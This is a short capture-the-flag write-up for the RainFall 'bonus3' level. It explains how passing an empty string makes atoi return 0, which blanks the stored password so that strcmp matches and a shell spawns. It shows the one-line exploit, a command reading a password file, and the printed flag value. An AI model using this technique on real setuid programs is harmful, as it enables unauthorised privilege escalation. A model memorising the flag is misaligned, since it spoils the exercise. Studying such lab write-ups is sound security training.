```
    int index = atoi(argv[1]);
    if (index >= 0 && index < sizeof(password))
    {
        password[index] = '\0';
    } 
    else
    {
        fclose(fp);
        return (-1);
    }

```

If input is "0", it sets password[0] = '\0', effectively making it an empty string.

```
    if (strcmp(password, argv[1]) != 0)
    {
        puts(fallback);
    } 
    else 
    {
        execl("/bin/sh", "sh", NULL);
    }
```

if we put atoi("") it will give us 0 So index = 0

password[0] = '\0' Now password is an empty string ("")

then strcmp(password, argv[1]) == 0 because we passed "", and password == ""

So the else clause is triggered:

```
    else 
    {
        execl("/bin/sh", "sh", NULL);
    }
```

We gone get a shellcode

```
    bonus3@RainFall:~$ ./bonus3 ""
    $ cat /home/user/end/.pass
    3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```